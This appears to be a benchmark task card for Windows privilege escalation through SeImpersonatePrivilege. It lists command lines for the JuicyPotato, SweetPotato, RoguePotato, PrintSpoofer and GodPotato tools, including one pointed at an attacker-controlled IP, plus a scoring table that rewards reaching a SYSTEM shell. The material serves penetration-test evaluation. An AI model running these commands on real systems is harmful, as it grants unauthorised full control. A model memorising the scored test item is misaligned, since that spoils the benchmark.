# FOX-PRIVESC-002: Windows Potato (SeImpersonate)

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-PRIVESC-002 |
| **Domain** | Privilege Escalation |
| **MITRE** | T1134.001 (Token Impersonation) |
| **Difficulty** | Medium |
| **Prerequisites** | Windows shell with SeImpersonatePrivilege (IIS, MSSQL, service accounts) |

## Methodology
1. **Check token privileges**:
   ```cmd
   whoami /priv
   ```
   Look for: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`
2. **If SeImpersonate present → Potato family**:
   - **JuicyPotato**: CLSID-based, works on Win 7-10 / Server 2008-2016
     ```cmd
     JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
     ```
   - **SweetPotato**: Universal, works Windows 10/11 + Server 2019/2022
     ```cmd
     SweetPotato.exe -p whoami
     ```
   - **RoguePotato**: OXID resolver, works on newer Windows
     ```cmd
     RoguePotato.exe -r <attacker-ip> -e cmd.exe -l 1337
     ```
   - **PrintSpoofer**: Most reliable for Server 2019/2022
     ```cmd
     PrintSpoofer.exe -i -c cmd
     ```
   - **GodPotato**: Latest .NET-based, works up to Windows 11
     ```cmd
     GodPotato.exe -cmd "cmd /c whoami"
     ```
3. **Verify**: `whoami` → `nt authority\system`

## Keywords
`windows-privilege-escalation`, `SeImpersonatePrivilege`, `JuicyPotato`, `SweetPotato`, `PrintSpoofer`, `RoguePotato`, `GodPotato`, `token impersonation`, `SYSTEM`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| SeImpersonatePrivilege confirmed | 15 |
| Potato tool uploaded and executed | 25 |
| SYSTEM token obtained | 35 |
| Shell as SYSTEM verified | 25 |
| **Total** | **100** |
